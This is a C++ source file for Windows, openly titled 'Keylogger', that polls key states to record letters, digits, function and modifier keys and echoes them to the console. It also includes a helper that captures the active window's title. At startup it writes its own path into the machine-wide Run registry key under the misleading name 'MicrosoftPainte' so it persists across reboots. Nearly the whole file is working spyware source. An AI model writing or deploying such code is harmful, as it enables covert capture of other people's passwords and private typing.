#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <Windows.h>
#include <string>
#include <atlstr.h>
#include <time.h>
#include <chrono>
#include <thread>
using namespace std;
char iss[200];
HWND console = GetConsoleWindow();
// Show the user change window
void Window(void)
{
	this_thread::sleep_for(chrono::seconds(1));
	time_t theTime = time(NULL);
	struct tm* aTime = localtime(&theTime);
	int day = aTime->tm_mday;
	int month = aTime->tm_mon + 1;
	int year = aTime->tm_year + 1900;
	int hour = aTime->tm_hour;
	int minute = aTime->tm_min;
	int seconds = aTime->tm_sec;

	HWND app = GetForegroundWindow();
	GetWindowTextA(app, iss, 200);
	cout << "[" << hour << ":" << minute << ":" << seconds << "]" << " " << iss << "\n";
}
// Log all keys delai => allows you to reduce or increase the delay between each check
void Keylogger(int delai) {
		if (GetKeyState('A') & 0x8000) {

			cout << "A";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('B') & 0x8000) {

			cout << "B";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('C') & 0x8000) {

			cout << "C";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}

		if (GetKeyState('D') & 0x8000) {

			cout << "D";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('E') & 0x8000) {

			cout << "E";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('F') & 0x8000) {

			cout << "F";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('G') & 0x8000) {

			cout << "G";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('H') & 0x8000) {

			cout << "H";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('I') & 0x8000) {

			cout << "I";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('J') & 0x8000) {

			cout << "J";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('K') & 0x8000) {

			cout << "K";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('L') & 0x8000) {

			cout << "L";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('M') & 0x8000) {

			cout << "M";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('N') & 0x8000) {

			cout << "N";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('O') & 0x8000) {

			cout << "O";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('P') & 0x8000) {

			cout << "P";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('Q') & 0x8000) {

			cout << "Q";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('R') & 0x8000) {

			cout << "R";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('S') & 0x8000) {

			cout << "S";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('T') & 0x8000) {

			cout << "T";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('U') & 0x8000) {

			cout << "U";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('V') & 0x8000) {

			cout << "V";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('X') & 0x8000) {

			cout << "X";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('Y') & 0x8000) {

			cout << "Y";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('Z') & 0x8000) {

			cout << "Z";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(VK_SPACE) & 0x8000) {

			cout << "[SPACE] ";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(VK_RETURN) & 0x8000) {

			cout << "\n";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(0x30) & 0x8000) {

			cout << "0";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(0x31) & 0x8000) {

			cout << "1";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(0x32) & 0x8000) {

			cout << "2";
			this_thread::sleep_for(chrono::milliseconds(delai));

		}
		if (GetKeyState(0x33) & 0x8000) {

			cout << "3";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(0x34) & 0x8000) {

			cout << "4";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(0x35) & 0x8000) {


			cout << "5";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(0x36) & 0x8000) {

			cout << "6";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(0x37) & 0x8000) {

			cout << "7";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(0x38) & 0x8000) {

			cout << "8";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(0x39) & 0x8000) {

			cout << "9";
			this_thread::sleep_for(chrono::milliseconds(delai));

		}
		if (GetKeyState(VK_TAB) & 0x8000) {
			cout << "[TAB] ";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(VK_F1) & 0x8000) {
			cout << "[F1] ";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(VK_F2) & 0x8000) {
			cout << "[F2] ";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(VK_F3) & 0x8000) {
			cout << "[F3] ";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(VK_F4) & 0x8000) {
			cout << "[F4] ";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(VK_F5) & 0x8000) {
			cout << "[F5] ";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(VK_F6) & 0x8000) {
			cout << "[F6] ";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(VK_F7) & 0x8000) {
			cout << "[F7] ";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(VK_F8) & 0x8000) {
			cout << "[F8] ";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(VK_F9) & 0x8000) {
			cout << "[F9] ";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(VK_F10) & 0x8000) {
			cout << "[F10] ";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(VK_F11) & 0x8000) {
			cout << "[F11] ";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(VK_F12) & 0x8000) {
			cout << "[F12] ";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(VK_CONTROL) & 0x8000) {
			cout << "[CTRL] ";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(VK_MENU) & 0x8000) {
			cout << "[ALT] ";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(VK_PAUSE) & 0x8000) {
			cout << "[PAUSE] ";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(VK_CAPITAL) & 0x8000) {
			cout << "[MAJ] ";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
	}


int main()
{
	int limit = 200;


	 ShowWindow(console, SW_SHOW);

	// Show window
	system("title Keylogger");
	string path;
	wstring newPath = L"";
// Declarations variables path and newPath => Regedit
	HMODULE hModule = NULL;
	char Path[MAX_PATH];
	GetModuleFileNameA(
		hModule,
		Path,
		(sizeof(Path))

	);
	path = Path;
	for (int i = 0; i < path.size(); i++)
	{
		if (path[i] == '\\')
		{
			newPath += path[i];
			newPath += path[i];
		}
		else
		{
			newPath += path[i];
		}
	}
	// Add to the path double slash \\

	HKEY key = NULL;
	LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE | KEY_READ, &key);
	// Open Regedit
	if (res == ERROR_SUCCESS) { // Check if sucess
		res = RegSetValueEx(key, TEXT("MicrosoftPainte"), 0, REG_SZ, (BYTE *)newPath.c_str(), (newPath.size()+1) * sizeof(wchar_t));
		// Write values
		if (res == ERROR_SUCCESS) {
			// Print Sucess if it Sucess !
			cout << "Sucess! \n";
		}
		else {
			// Print Error if it doesn't work
			cout << "Error! \n";
		}
	}
	else {
		// If he can't open the register
		cout << "Not working \n";
	}


	while (true)
	{
	// In development
	Keylogger(100);	
	}
}
